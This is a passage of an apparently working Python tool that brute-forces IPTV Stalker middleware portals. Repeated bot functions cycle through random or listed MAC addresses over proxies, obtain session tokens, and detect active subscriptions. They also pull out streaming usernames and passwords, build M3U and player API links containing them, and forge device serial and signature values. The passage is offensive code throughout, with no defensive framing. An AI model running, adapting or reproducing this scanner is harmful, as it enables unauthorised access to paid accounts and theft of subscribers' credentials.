                        listlink = liveurl
                        livel = ' 🔹🕳🔹 '
                        livelist = list(listlink, macs, token, livel)
                    if channels == '2':
                        listlink = vodurl
                        livel = ' 🔹🕳🔹 '
                        vodlist = list(listlink, macs, token, livel)
                        listlink = seriesurl
                        livel = ' 🔹🕳🔹 '
                        serieslist = list(listlink, macs, token, livel)
                    hit(mac, trh, real, m3ulink, case, vpn, livelist, vodlist, serieslist, playerapi, SN, SNENC, SNCUT, DEV, DEVENC, SG, SING, SINGENC)


def d13():
    global bad
    global hitc
    global hitr
    global prox
    global tokenr
    for mac in range(13, to, botsay):
        total = mac
        if dosia == '0':
            mac = randommac()
        else:
            macv = re.search(pattern, totLen[mac], re.IGNORECASE)
            if macv:
                mac = macv.group()
            else:
                continue
        macs = mac.upper().replace(':', '%3A')
        bot = 'Bot_13'
        oran = ''
        oran = round(total / to * 100, 2)
        if proxi == '1':
            for pdata in range(13, prox, botsay):
                prox += 1
                bad += 1
                break

        echok(mac, bot, total, hitc, oran, tokenr, proxies)
        bag = 0
        data = ''
        while True:
            try:
                res = ses.get(url1, proxies=proxies, headers=(hea1(macs)), timeout=15, verify=False)
                data = str(res.text)
                break
            except:
                bag = bag + 1
                time.sleep(1)
                if bag == 12:
                    break

        tokenr = ' \x1b[35m'
        if 'token' in data:
            tokenr = '\x1b[0m'
            token = data.replace('{"js":{"token":"', '')
            token = token.split('"')[0]
            bag = 0
            while 1:
                try:
                    res = ses.get(url2, proxies=proxies, headers=(hea2(macs, token)), timeout=15, verify=False)
                    data = ''
                    data = str(res.text)
                    break
                except:
                    bag = bag + 1
                    time.sleep(1)
                    if bag == 12:
                        break

            id = 'null'
            ip = ''
            try:
                id = data.split('{"js":{"id":')[1]
                id = id.split(',"name')[0]
                ip = data.split('ip":"')[1]
                ip = ip.split('"')[0]
            except:
                pass

            if not id == 'null':
                bag = 0
                while 1:
                    try:
                        res = ses.get(url3, proxies=proxies, headers=(hea2(macs, token)), timeout=15, verify=False)
                        data = ''
                        data = str(res.text)
                        break
                    except:
                        bag = bag + 1
                        time.sleep(1)
                        if bag == 12:
                            break

                if not data.count('phone') == 0:
                    hitr = '\x1b[1;36m'
                    hitc = hitc + 1
                    trh = ''
                    if 'end_date' in data:
                        trh = data.split('end_date":"')[1]
                        trh = trh.split('"')[0]
                    else:
                        try:
                            trh = data.split('phone":"')[1]
                            trh = trh.split('"')[0]
                            if trh.lower()[:2] == 'un':
                                DaysRemain = ' Days'
                            else:
                                DaysRemain = str(tarih_clear(trh)) + ' Days'
                                trh = trh + ' ' + DaysRemain
                        except:
                            pass

                        hitprint(mac, trh)
                        bag = 0
                        while 1:
                            try:
                                res = ses.get(url6, proxies=proxies, headers=(hea2(macs, token)), timeout=10, verify=False)
                                data = ''
                                data = str(res.text)
                                cid = ''
                                cid = str(res.text).split('ch_id":"')[5].split('"')[0]
                                break
                            except:
                                bag = bag + 1
                                time.sleep(1)
                                if bag == 12:
                                    cid = '94067'
                                    break

                        real = panel
                        m3ulink = ''
                        user = ''
                        pas = ''
                        case = '𝙐𝙣𝙠𝙣𝙤𝙬𝙣'
                        bag = 0
                        while 1:
                            try:
                                res = ses.get((url(cid)), proxies=proxies, headers=(hea2(macs, token)), timeout=15, verify=False)
                                data = ''
                                data = str(res.text)
                                link = data.split('ffmpeg ')[1].split('"')[0].replace('\\/', '/')
                                real = '' + link.split('://')[1].split('/')[0] + ''
                                user = str(link.replace('live/', '').split('/')[3])
                                pas = str(link.replace('live/', '').split('/')[4])
                                m3ulink = 'http://' + real.replace('http://', '').replace('/c/', '') + '/get.php?username=' + str(user) + '&password=' + str(pas) + '&type=m3u_plus'
                                case = goruntu(link)
                                break
                            except:
                                bag = bag + 1
                                time.sleep(1)
                                if bag == 12:
                                    break

                        playerapi = ''
                        if not m3ulink == '':
                            playerlink = str('http://' + real.replace('http://', '').replace('/c/', '') + '/player_api.php?username=' + user + '&password=' + pas)
                            playerapi = m3uapi(playerlink, macs, token)
                            if playerapi == '':
                                playerlink = str('http://' + panel.replace('http://', '').replace('/c/', '') + '/player_api.php?username=' + user + '&password=' + pas)
                                playerapi = m3uapi(playerlink, macs, token)
                            SN = hashlib.md5(mac.encode('utf-8')).hexdigest()
                            SNENC = SN.upper()
                            SNCUT = SNENC[:13]
                            DEV = hashlib.sha256(mac.encode('utf-8')).hexdigest()
                            DEVENC = DEV.upper()
                            SG = SNCUT + '+' + mac
                            SING = hashlib.sha256(SG.encode('utf-8')).hexdigest()
                            SINGENC = SING.upper()
                            vpn = ''
                            vpn = ip == '' or vpnip(ip)
                        else:
                            vpn = '𝙉𝙊 𝙄𝙋 𝘼𝘿𝘿𝙍𝙀𝙎𝙎'
                    livelist = ''
                    vodlist = ''
                    serieslist = ''
                    if channels == '1' or channels == '2':
                        listlink = liveurl
                        livel = ' 🔹🕳🔹 '
                        livelist = list(listlink, macs, token, livel)
                    if channels == '2':
                        listlink = vodurl
                        livel = ' 🔹🕳🔹 '
                        vodlist = list(listlink, macs, token, livel)
                        listlink = seriesurl
                        livel = ' 🔹🕳🔹 '
                        serieslist = list(listlink, macs, token, livel)
                    hit(mac, trh, real, m3ulink, case, vpn, livelist, vodlist, serieslist, playerapi, SN, SNENC, SNCUT, DEV, DEVENC, SG, SING, SINGENC)


def d14():
    global bad
    global hitc
    global hitr
    global prox
    global tokenr
    for mac in range(14, to, botsay):
        total = mac
        if dosia == '0':
            mac = randommac()
        else:
            macv = re.search(pattern, totLen[mac], re.IGNORECASE)
            if macv:
                mac = macv.group()
            else:
                continue
        macs = mac.upper().replace(':', '%3A')
        bot = 'Bot_14'
        oran = ''
        oran = round(total / to * 100, 2)
        if proxi == '1':
            for pdata in range(14, prox, botsay):
                prox += 1
                bad += 1
                break

        echok(mac, bot, total, hitc, oran, tokenr, proxies)
        bag = 0
        data = ''
        while True:
            try:
                res = ses.get(url1, proxies=proxies, headers=(hea1(macs)), timeout=15, verify=False)
                data = str(res.text)
                break
            except:
                bag = bag + 1
                time.sleep(1)
                if bag == 12:
                    break

        tokenr = ' \x1b[35m'
        if 'token' in data:
            tokenr = '\x1b[0m'
            token = data.replace('{"js":{"token":"', '')
            token = token.split('"')[0]
            bag = 0
            while 1:
                try:
                    res = ses.get(url2, proxies=proxies, headers=(hea2(macs, token)), timeout=15, verify=False)
                    data = ''
                    data = str(res.text)
                    break
                except:
                    bag = bag + 1
                    time.sleep(1)
                    if bag == 12:
                        break

            id = 'null'
            ip = ''
            try:
                id = data.split('{"js":{"id":')[1]
                id = id.split(',"name')[0]
                ip = data.split('ip":"')[1]
                ip = ip.split('"')[0]
            except:
                pass

            if not id == 'null':
                bag = 0
                while 1:
                    try:
                        res = ses.get(url3, proxies=proxies, headers=(hea2(macs, token)), timeout=15, verify=False)
                        data = ''
                        data = str(res.text)
                        break
                    except:
                        bag = bag + 1
                        time.sleep(1)
                        if bag == 12:
                            break

                if not data.count('phone') == 0:
                    hitr = '\x1b[1;36m'
                    hitc = hitc + 1
                    trh = ''
                    if 'end_date' in data:
                        trh = data.split('end_date":"')[1]
                        trh = trh.split('"')[0]
                    else:
                        try:
                            trh = data.split('phone":"')[1]
                            trh = trh.split('"')[0]
                            if trh.lower()[:2] == 'un':
                                DaysRemain = ' Days'
                            else:
                                DaysRemain = str(tarih_clear(trh)) + ' Days'
                                trh = trh + ' ' + DaysRemain
                        except:
                            pass

                        hitprint(mac, trh)
                        bag = 0
                        while 1:
                            try:
                                res = ses.get(url6, proxies=proxies, headers=(hea2(macs, token)), timeout=10, verify=False)
                                data = ''
                                data = str(res.text)
                                cid = ''
                                cid = str(res.text).split('ch_id":"')[5].split('"')[0]
                                break
                            except:
                                bag = bag + 1
                                time.sleep(1)
                                if bag == 12:
                                    cid = '94067'
                                    break

                        real = panel
                        m3ulink = ''
                        user = ''
                        pas = ''
                        case = '𝙐𝙣𝙠𝙣𝙤𝙬𝙣'
                        bag = 0
                        while 1:
                            try:
                                res = ses.get((url(cid)), proxies=proxies, headers=(hea2(macs, token)), timeout=15, verify=False)
                                data = ''
                                data = str(res.text)
                                link = data.split('ffmpeg ')[1].split('"')[0].replace('\\/', '/')
                                real = '' + link.split('://')[1].split('/')[0] + ''
                                user = str(link.replace('live/', '').split('/')[3])
                                pas = str(link.replace('live/', '').split('/')[4])
                                m3ulink = 'http://' + real.replace('http://', '').replace('/c/', '') + '/get.php?username=' + str(user) + '&password=' + str(pas) + '&type=m3u_plus'
                                case = goruntu(link)
                                break
                            except:
                                bag = bag + 1
                                time.sleep(1)
                                if bag == 12:
                                    break

                        playerapi = ''
                        if not m3ulink == '':
                            playerlink = str('http://' + real.replace('http://', '').replace('/c/', '') + '/player_api.php?username=' + user + '&password=' + pas)
                            playerapi = m3uapi(playerlink, macs, token)
                            if playerapi == '':
                                playerlink = str('http://' + panel.replace('http://', '').replace('/c/', '') + '/player_api.php?username=' + user + '&password=' + pas)
                                playerapi = m3uapi(playerlink, macs, token)
                            SN = hashlib.md5(mac.encode('utf-8')).hexdigest()
                            SNENC = SN.upper()
                            SNCUT = SNENC[:13]
                            DEV = hashlib.sha256(mac.encode('utf-8')).hexdigest()
                            DEVENC = DEV.upper()
                            SG = SNCUT + '+' + mac
                            SING = hashlib.sha256(SG.encode('utf-8')).hexdigest()
                            SINGENC = SING.upper()
                            vpn = ''
                            vpn = ip == '' or vpnip(ip)
                        else:
                            vpn = '𝙉𝙊 𝙄𝙋 𝘼𝘿𝘿𝙍𝙀𝙎𝙎'
                    livelist = ''
                    vodlist = ''
                    serieslist = ''
                    if channels == '1' or channels == '2':
                        listlink = liveurl
                        livel = ' 🔹🕳🔹 '
                        livelist = list(listlink, macs, token, livel)
                    if channels == '2':
                        listlink = vodurl
                        livel = ' 🔹🕳🔹 '
                        vodlist = list(listlink, macs, token, livel)
                        listlink = seriesurl
                        livel = ' 🔹🕳🔹 '
                        serieslist = list(listlink, macs, token, livel)
                    hit(mac, trh, real, m3ulink, case, vpn, livelist, vodlist, serieslist, playerapi, SN, SNENC, SNCUT, DEV, DEVENC, SG, SING, SINGENC)


def d15():
    global bad
    global hitc
    global hitr
    global prox
    global tokenr
    for mac in range(15, to, botsay):
        total = mac
        if dosia == '0':
            mac = randommac()
        else:
            macv = re.search(pattern, totLen[mac], re.IGNORECASE)
            if macv:
                mac = macv.group()
            else:
                continue
        macs = mac.upper().replace(':', '%3A')
        bot = 'Bot_15'
        oran = ''
        oran = round(total / to * 100, 2)
        if proxi == '1':
            for pdata in range(15, prox, botsay):
                prox += 1
                bad += 1
                break

        echok(mac, bot, total, hitc, oran, tokenr, proxies)
        bag = 0
        data = ''
        while True:
            try:
                res = ses.get(url1, proxies=proxies, headers=(hea1(macs)), timeout=15, verify=False)
                data = str(res.text)
                break
            except:
                bag = bag + 1
                time.sleep(1)
                if bag == 12:
                    break

        tokenr = ' \x1b[35m'
        if 'token' in data:
            tokenr = '\x1b[0m'
            token = data.replace('{"js":{"token":"', '')
            token = token.split('"')[0]
            bag = 0
            while 1:
                try:
                    res = ses.get(url2, proxies=proxies, headers=(hea2(macs, token)), timeout=15, verify=False)
                    data = ''
                    data = str(res.text)
                    break
                except:
                    bag = bag + 1
                    time.sleep(1)
                    if bag == 12:
                        break

            id = 'null'
            ip = ''
            try:
                id = data.split('{"js":{"id":')[1]
                id = id.split(',"name')[0]
                ip = data.split('ip":"')[1]
                ip = ip.split('"')[0]
            except:
                pass

            if not id == 'null':
                bag = 0
                while 1:
                    try:
                        res = ses.get(url3, proxies=proxies, headers=(hea2(macs, token)), timeout=15, verify=False)
                        data = ''
                        data = str(res.text)
                        break
                    except:
                        bag = bag + 1
                        time.sleep(1)
                        if bag == 12:
                            break

                if not data.count('phone') == 0:
                    hitr = '\x1b[1;36m'
                    hitc = hitc + 1
                    trh = ''
                    if 'end_date' in data:
                        trh = data.split('end_date":"')[1]
                        trh = trh.split('"')[0]
                    else:
                        try:
                            trh = data.split('phone":"')[1]
                            trh = trh.split('"')[0]
                            if trh.lower()[:2] == 'un':
                                DaysRemain = ' Days'
                            else:
                                DaysRemain = str(tarih_clear(trh)) + ' Days'
                                trh = trh + ' ' + DaysRemain
                        except:
                            pass

                        hitprint(mac, trh)
                        bag = 0
                        while 1:
                            try:
                                res = ses.get(url6, proxies=proxies, headers=(hea2(macs, token)), timeout=10, verify=False)
                                data = ''
                                data = str(res.text)
                                cid = ''
                                cid = str(res.text).split('ch_id":"')[5].split('"')[0]
                                break
                            except:
                                bag = bag + 1
                                time.sleep(1)
                                if bag == 12:
                                    cid = '94067'
                                    break

                        real = panel
                        m3ulink = ''
                        user = ''
                        pas = ''
                        case = '𝙐𝙣𝙠𝙣𝙤𝙬𝙣'
                        bag = 0
                        while 1:
                            try:
                                res = ses.get((url(cid)), proxies=proxies, headers=(hea2(macs, token)), timeout=15, verify=False)
                                data = ''
                                data = str(res.text)
                                link = data.split('ffmpeg ')[1].split('"')[0].replace('\\/', '/')
                                real = '' + link.split('://')[1].split('/')[0] + ''
                                user = str(link.replace('live/', '').split('/')[3])
                                pas = str(link.replace('live/', '').split('/')[4])
                                m3ulink = 'http://' + real.replace('http://', '').replace('/c/', '') + '/get.php?username=' + str(user) + '&password=' + str(pas) + '&type=m3u_plus'
                                case = goruntu(link)
                                break
                            except:
                                bag = bag + 1
                                time.sleep(1)
                                if bag == 12:
                                    break

                        playerapi = ''
                        if not m3ulink == '':
                            playerlink = str('http://' + real.replace('http://', '').replace('/c/', '') + '/player_api.php?username=' + user + '&password=' + pas)
                            playerapi = m3uapi(playerlink, macs, token)
                            if playerapi == '':
                                playerlink = str('http://' + panel.replace('http://', '').replace('/c/', '') + '/player_api.php?username=' + user + '&password=' + pas)
                                playerapi = m3uapi(playerlink, macs, token)
                            SN = hashlib.md5(mac.encode('utf-8')).hexdigest()
                            SNENC = SN.upper()
                            SNCUT = SNENC[:13]
                            DEV = hashlib.sha256(mac.encode('utf-8')).hexdigest()
                            DEVENC = DEV.upper()
                            SG = SNCUT + '+' + mac
                            SING = hashlib.sha256(SG.encode('utf-8')).hexdigest()
                            SINGENC = SING.upper()
                            vpn = ''
                            vpn = ip == '' or vpnip(ip)
                        else:
                            vpn = '𝙉𝙊 𝙄𝙋 𝘼𝘿𝘿𝙍𝙀𝙎𝙎'
                    livelist = ''
                    vodlist = ''
                    serieslist = ''
                    if channels == '1' or channels == '2':
                        listlink = liveurl
                        livel = ' 🔹🕳🔹 '
                        livelist = list(listlink, macs, token, livel)
                    if channels == '2':
                        listlink = vodurl
                        livel = ' 🔹🕳🔹 '
                        vodlist = list(listlink, macs, token, livel)
                        listlink = seriesurl
                        livel = ' 🔹🕳🔹 '
                        serieslist = list(listlink, macs, token, livel)
                    hit(mac, trh, real, m3ulink, case, vpn, livelist, vodlist, serieslist, playerapi, SN, SNENC, SNCUT, DEV, DEVENC, SG, SING, SINGENC)


def d16():
    global bad
    global hitc
    global hitr
    global prox
    global tokenr
    for mac in range(16, to, botsay):
        total = mac
        if dosia == '0':
            mac = randommac()
        else:
            macv = re.search(pattern, totLen[mac], re.IGNORECASE)
            if macv:
                mac = macv.group()
            else:
                continue
        macs = mac.upper().replace(':', '%3A')
        bot = 'Bot_16'
        oran = ''
        oran = round(total / to * 100, 2)
        if proxi == '1':
            for pdata in range(16, prox, botsay):
                prox += 1
                bad += 1
                break

        echok(mac, bot, total, hitc, oran, tokenr, proxies)
        bag = 0
        data = ''
        while True:
            try:
                res = ses.get(url1, proxies=proxies, headers=(hea1(macs)), timeout=15, verify=False)
                data = str(res.text)
                break
            except:
                bag = bag + 1
                time.sleep(1)
                if bag == 12:
                    break

        tokenr = ' \x1b[35m'
        if 'token' in data:
            tokenr = '\x1b[0m'
            token = data.replace('{"js":{"token":"', '')
            token = token.split('"')[0]
            bag = 0
            while 1:
                try:
                    res = ses.get(url2, proxies=proxies, headers=(hea2(macs, token)), timeout=15, verify=False)
                    data = ''
                    data = str(res.text)
                    break
                except:
                    bag = bag + 1
                    time.sleep(1)
                    if bag == 12:
                        break

            id = 'null'
            ip = ''
            try:
                id = data.split('{"js":{"id":')[1]
                id = id.split(',"name')[0]
                ip = data.split('ip":"')[1]
                ip = ip.split('"')[0]
            except:
                pass

            if not id == 'null':
                bag = 0
                while 1:
                    try:
                        res = ses.get(url3, proxies=proxies, headers=(hea2(macs, token)), timeout=15, verify=False)
                        data = ''
                        data = str(res.text)
                        break
                    except:
                        bag = bag + 1
                        time.sleep(1)
                        if bag == 12:
                            break

                if not data.count('phone') == 0:
                    hitr = '\x1b[1;36m'
                    hitc = hitc + 1
                    trh = ''
                    if 'end_date' in data:
                        trh = data.split('end_date":"')[1]
                        trh = trh.split('"')[0]
                    else:
                        try:
                            trh = data.split('phone":"')[1]
                            trh = trh.split('"')[0]
                            if trh.lower()[:2] == 'un':
                                DaysRemain = ' Days'
                            else:
                                DaysRemain = str(tarih_clear(trh)) + ' Days'
                                trh = trh + ' ' + DaysRemain
                        except:
                            pass

                        hitprint(mac, trh)
                        bag = 0
                        while 1:
                            try:
                                res = ses.get(url6, proxies=proxies, headers=(hea2(macs, token)), timeout=10, verify=False)
                                data = ''
                                data = str(res.text)
                                cid = ''
                                cid = str(res.text).split('ch_id":"')[5].split('"')[0]
                                break
                            except:
                                bag = bag + 1
                                time.sleep(1)
                                if bag == 12:
                                    cid = '94067'
                                    break

                        real = panel
                        m3ulink = ''
                        user = ''
                        pas = ''
                        case = '𝙐𝙣𝙠𝙣𝙤𝙬𝙣'
                        bag = 0
                        while 1:
                            try:
                                res = ses.get((url(cid)), proxies=proxies, headers=(hea2(macs, token)), timeout=15, verify=False)
                                data = ''
                                data = str(res.text)
                                link = data.split('ffmpeg ')[1].split('"')[0].replace('\\/', '/')
                                real = '' + link.split('://')[1].split('/')[0] + ''
                                user = str(link.replace('live/', '').split('/')[3])
                                pas = str(link.replace('live/', '').split('/')[4])
                                m3ulink = 'http://' + real.replace('http://', '').replace('/c/', '') + '/get.php?username=' + str(user) + '&password=' + str(pas) + '&type=m3u_plus'
                                case = goruntu(link)
                                break
                            except:
                                bag = bag + 1
                                time.sleep(1)
                                if bag == 12:
                                    break

                        playerapi = ''
                        if not m3ulink == '':
                            playerlink = str('http://' + real.replace('http://', '').replace('/c/', '') + '/player_api.php?username=' + user + '&password=' + pas)
                            playerapi = m3uapi(playerlink, macs, token)
                            if playerapi == '':
                                playerlink = str('http://' + panel.replace('http://', '').replace('/c/', '') + '/player_api.php?username=' + user + '&password=' + pas)
                                playerapi = m3uapi(playerlink, macs, token)
                            SN = hashlib.md5(mac.encode('utf-8')).hexdigest()
                            SNENC = SN.upper()
                            SNCUT = SNENC[:13]
                            DEV = hashlib.sha256(mac.encode('utf-8')).hexdigest()
                            DEVENC = DEV.upper()
                            SG = SNCUT + '+' + mac
                            SING = hashlib.sha256(SG.encode('utf-8')).hexdigest()
                            SINGENC = SING.upper()
                            vpn = ''
                            vpn = ip == '' or vpnip(ip)
                        else:
                            vpn = '𝙉𝙊 𝙄𝙋 𝘼𝘿𝘿𝙍𝙀𝙎𝙎'
                    livelist = ''
                    vodlist = ''
                    serieslist = ''
                    if channels == '1' or channels == '2':
                        listlink = liveurl
                        livel = ' 🔹🕳🔹 '
                        livelist = list(listlink, macs, token, livel)
                    if channels == '2':
                        listlink = vodurl
                        livel = ' 🔹🕳🔹 '
                        vodlist = list(listlink, macs, token, livel)
                        listlink = seriesurl
                        livel = ' 🔹🕳🔹 '
                        serieslist = list(listlink, macs, token, livel)
                    hit(mac, trh, real, m3ulink, case, vpn, livelist, vodlist, serieslist, playerapi, SN, SNENC, SNCUT, DEV, DEVENC, SG, SING, SINGENC)


def d17():
    global bad
    global hitc
    global hitr
    global prox
    global tokenr
    for mac in range(17, to, botsay):
        total = mac
        if dosia == '0':
            mac = randommac()
        else:
            macv = re.search(pattern, totLen[mac], re.IGNORECASE)
            if macv:
                mac = macv.group()
            else:
                continue
        macs = mac.upper().replace(':', '%3A')
        bot = 'Bot_17'
        oran = ''
        oran = round(total / to * 100, 2)
        if proxi == '1':
            for pdata in range(17, prox, botsay):
                prox += 1
                bad += 1
                break

        echok(mac, bot, total, hitc, oran, tokenr, proxies)
        bag = 0
        data = ''
        while True:
            try:
                res = ses.get(url1, proxies=proxies, headers=(hea1(macs)), timeout=15, verify=False)
                data = str(res.text)
                break
            except:
                bag = bag + 1
                time.sleep(1)
                if bag == 12:
                    break

        tokenr = ' \x1b[35m'
        if 'token' in data:
            tokenr = '\x1b[0m'
            token = data.replace('{"js":{"token":"', '')
            token = token.split('"')[0]
            bag = 0
            while 1:
                try:
                    res = ses.get(url2, proxies=proxies, headers=(hea2(macs, token)), timeout=15, verify=False)
                    data = ''
                    data = str(res.text)
                    break
                except:
                    bag = bag + 1
                    time.sleep(1)
                    if bag == 12:
                        break

            id = 'null'
            ip = ''
            try:
                id = data.split('{"js":{"id":')[1]
                id = id.split(',"name')[0]
                ip = data.split('ip":"')[1]
                ip = ip.split('"')[0]
            except:
                pass

            if not id == 'null':
                bag = 0
                while 1:
                    try:
                        res = ses.get(url3, proxies=proxies, headers=(hea2(macs, token)), timeout=15, verify=False)
                        data = ''
                        data = str(res.text)
                        break
                    except:
                        bag = bag + 1
                        time.sleep(1)
                        if bag == 12:
                            break

                if not data.count('phone') == 0:
                    hitr = '\x1b[1;36m'
                    hitc = hitc + 1
                    trh = ''
                    if 'end_date' in data:
                        trh = data.split('end_date":"')[1]
                        trh = trh.split('"')[0]
                    else:
                        try:
                            trh = data.split('phone":"')[1]
                            trh = trh.split('"')[0]
                            if trh.lower()[:2] == 'un':
                                DaysRemain = ' Days'
                            else:
                                DaysRemain = str(tarih_clear(trh)) + ' Days'
                                trh = trh + ' ' + DaysRemain
                        except:
                            pass

                        hitprint(mac, trh)
                        bag = 0
                        while 1:
                            try:
                                res = ses.get(url6, proxies=proxies, headers=(hea2(macs, token)), timeout=10, verify=False)
                                data = ''
                                data = str(res.text)
                                cid = ''
                                cid = str(res.text).split('ch_id":"')[5].split('"')[0]
                                break
                            except:
                                bag = bag + 1
                                time.sleep(1)
                                if bag == 12:
                                    cid = '94067'
                                    break

                        real = panel
                        m3ulink = ''
                        user = ''
                        pas = ''
                        case = '𝙐𝙣𝙠𝙣𝙤𝙬𝙣'
                        bag = 0
                        while 1:
                            try:
                                res = ses.get((url(cid)), proxies=proxies, headers=(hea2(macs, token)), timeout=15, verify=False)
                                data = ''
                                data = str(res.text)
                                link = data.split('ffmpeg ')[1].split('"')[0].replace('\\/', '/')
                                real = '' + link.split('://')[1].split('/')[0] + ''
                                user = str(link.replace('live/', '').split('/')[3])
                                pas = str(link.replace('live/', '').split('/')[4])
                                m3ulink = 'http://' + real.replace('http://', '').replace('/c/', '') + '/get.php?username=' + str(user) + '&password=' + str(pas) + '&type=m3u_plus'
                                case = goruntu(link)
                                break
                            except:
                                bag = bag + 1
                                time.sleep(1)
                                if bag == 12:
                                    break

                        playerapi = ''
                        if not m3ulink == '':
                            playerlink = str('http://' + real.replace('http://', '').replace('/c/', '') + '/player_api.php?username=' + user + '&password=' + pas)
                            playerapi = m3uapi(playerlink, macs, token)
                            if playerapi == '':
                                playerlink = str('http://' + panel.replace('http://', '').replace('/c/', '') + '/player_api.php?username=' + user + '&password=' + pas)
                                playerapi = m3uapi(playerlink, macs, token)
                            SN = hashlib.md5(mac.encode('utf-8')).hexdigest()
                            SNENC = SN.upper()
                            SNCUT = SNENC[:13]
                            DEV = hashlib.sha256(mac.encode('utf-8')).hexdigest()
                            DEVENC = DEV.upper()
                            SG = SNCUT + '+' + mac
                            SING = hashlib.sha256(SG.encode('utf-8')).hexdigest()
                            SINGENC = SING.upper()
                            vpn = ''
                            vpn = ip == '' or vpnip(ip)
                        else:
                            vpn = '𝙉𝙊 𝙄𝙋 𝘼𝘿𝘿𝙍𝙀𝙎𝙎'
                    livelist = ''
                    vodlist = ''
                    serieslist = ''
                    if channels == '1' or channels == '2':
                        listlink = liveurl
                        livel = ' 🔹🕳🔹 '
                        livelist = list(listlink, macs, token, livel)
                    if channels == '2':
                        listlink = vodurl
                        livel = ' 🔹🕳🔹 '
                        vodlist = list(listlink, macs, token, livel)
                        listlink = seriesurl
                        livel = ' 🔹🕳🔹 '
                        serieslist = list(listlink, macs, token, livel)
                    hit(mac, trh, real, m3ulink, case, vpn, livelist, vodlist, serieslist, playerapi, SN, SNENC, SNCUT, DEV, DEVENC, SG, SING, SINGENC)


def d18():
    global bad
    global hitc
    global hitr
    global prox
    global tokenr
    for mac in range(18, to, botsay):
        total = mac
        if dosia == '0':
            mac = randommac()
        else:
            macv = re.search(pattern, totLen[mac], re.IGNORECASE)
            if macv:
                mac = macv.group()
            else:
                continue
        macs = mac.upper().replace(':', '%3A')
        bot = 'Bot_18'
        oran = ''
        oran = round(total / to * 100, 2)
        if proxi == '1':
            for pdata in range(18, prox, botsay):
                prox += 1
                bad += 1
                break

        echok(mac, bot, total, hitc, oran, tokenr, proxies)
        bag = 0
        data = ''
        while True:
            try:
                res = ses.get(url1, proxies=proxies, headers=(hea1(macs)), timeout=15, verify=False)
                data = str(res.text)
                break
            except:
                bag = bag + 1
                time.sleep(1)
                if bag == 12:
                    break

        tokenr = ' \x1b[35m'
        if 'token' in data:
            tokenr = '\x1b[0m'
            token = data.replace('{"js":{"token":"', '')
            token = token.split('"')[0]
            bag = 0
            while 1:
                try:
                    res = ses.get(url2, proxies=proxies, headers=(hea2(macs, token)), timeout=15, verify=False)
                    data = ''
                    data = str(res.text)
                    break
                except:
                    bag = bag + 1
                    time.sleep(1)
                    if bag == 12:
                        break

            id = 'null'
            ip = ''
            try:
                id = data.split('{"js":{"id":')[1]
                id = id.split(',"name')[0]
                ip = data.split('ip":"')[1]
                ip = ip.split('"')[0]
            except:
                pass

            if not id == 'null':
                bag = 0
                while 1:
                    try:
                        res = ses.get(url3, proxies=proxies, headers=(hea2(macs, token)), timeout=15, verify=False)
                        data = ''
                        data = str(res.text)
                        break
                    except:
                        bag = bag + 1
                        time.sleep(1)
                        if bag == 12:
                            break

                if not data.count('phone') == 0:
                    hitr = '\x1b[1;36m'
                    hitc = hitc + 1
                    trh = ''
                    if 'end_date' in data:
                        trh = data.split('end_date":"')[1]
                        trh = trh.split('"')[0]
                    else:
                        try:
                            trh = data.split('phone":"')[1]
                            trh = trh.split('"')[0]
                            if trh.lower()[:2] == 'un':
                                DaysRemain = ' Days'
                            else:
                                DaysRemain = str(tarih_clear(trh)) + ' Days'
                                trh = trh + ' ' + DaysRemain
                        except:
                            pass

                        hitprint(mac, trh)
                        bag = 0
                        while 1:
                            try:
                                res = ses.get(url6, proxies=proxies, headers=(hea2(macs, token)), timeout=10, verify=False)
                                data = ''
                                data = str(res.text)
                                cid = ''
                                cid = str(res.text).split('ch_id":"')[5].split('"')[0]
                                break
                            except:
                                bag = bag + 1
                                time.sleep(1)
                                if bag == 12:
                                    cid = '94067'
                                    break

                        real = panel
                        m3ulink = ''
                        user = ''
                        pas = ''
                        case = '𝙐𝙣𝙠𝙣𝙤𝙬𝙣'
                        bag = 0
                        while 1:
                            try:
                                res = ses.get((url(cid)), proxies=proxies, headers=(hea2(macs, token)), timeout=15, verify=False)
                                data = ''
                                data = str(res.text)
                                link = data.split('ffmpeg ')[1].split('"')[0].replace('\\/', '/')
                                real = '' + link.split('://')[1].split('/')[0] + ''
                                user = str(link.replace('live/', '').split('/')[3])
                                pas = str(link.replace('live/', '').split('/')[4])
                                m3ulink = 'http://' + real.replace('http://', '').replace('/c/', '') + '/get.php?username=' + str(user) + '&password=' + str(pas) + '&type=m3u_plus'
                                case = goruntu(link)
                                break
                            except:
                                bag = bag + 1
                                time.sleep(1)
                                if bag == 12:
                                    break

                        playerapi = ''
                        if not m3ulink == '':
                            playerlink = str('http://' + real.replace('http://', '').replace('/c/', '') + '/player_api.php?username=' + user + '&password=' + pas)
                            playerapi = m3uapi(playerlink, macs, token)
                            if playerapi == '':
                                playerlink = str('http://' + panel.replace('http://', '').replace('/c/', '') + '/player_api.php?username=' + user + '&password=' + pas)
                                playerapi = m3uapi(playerlink, macs, token)
                            SN = hashlib.md5(mac.encode('utf-8')).hexdigest()
                            SNENC = SN.upper()
                            SNCUT = SNENC[:13]
                            DEV = hashlib.sha256(mac.encode('utf-8')).hexdigest()
                            DEVENC = DEV.upper()
                            SG = SNCUT + '+' + mac
                            SING = hashlib.sha256(SG.encode('utf-8')).hexdigest()
                            SINGENC = SING.upper()
                            vpn = ''
                            vpn = ip == '' or vpnip(ip)
                        else:
                            vpn = '𝙉𝙊 𝙄𝙋 𝘼𝘿𝘿𝙍𝙀𝙎𝙎'
                    livelist = ''
                    vodlist = ''
                    serieslist = ''
                    if channels == '1' or channels == '2':
                        listlink = liveurl
                        livel = ' 🔹🕳🔹 '
                        livelist = list(listlink, macs, token, livel)
                    if channels == '2':
                        listlink = vodurl
                        livel = ' 🔹🕳🔹 '
                        vodlist = list(listlink, macs, token, livel)
                        listlink = seriesurl
                        livel = ' 🔹🕳🔹 '
                        serieslist = list(listlink, macs, token, livel)
                    hit(mac, trh, real, m3ulink, case, vpn, livelist, vodlist, serieslist, playerapi, SN, SNENC, SNCUT, DEV, DEVENC, SG, SING, SINGENC)


def d19():
    global bad
    global hitc
    global hitr
    global prox
    global tokenr
    for mac in range(19, to, botsay):
        total = mac
        if dosia == '0':
            mac = randommac()
        else:
            macv = re.search(pattern, totLen[mac], re.IGNORECASE)
            if macv:
                mac = macv.group()
            else:
                continue
        macs = mac.upper().replace(':', '%3A')
        bot = 'Bot_19'
        oran = ''
        oran = round(total / to * 100, 2)
        if proxi == '1':
            for pdata in range(19, prox, botsay):
                prox += 1
                bad += 1
                break

        echok(mac, bot, total, hitc, oran, tokenr, proxies)
        bag = 0
        data = ''
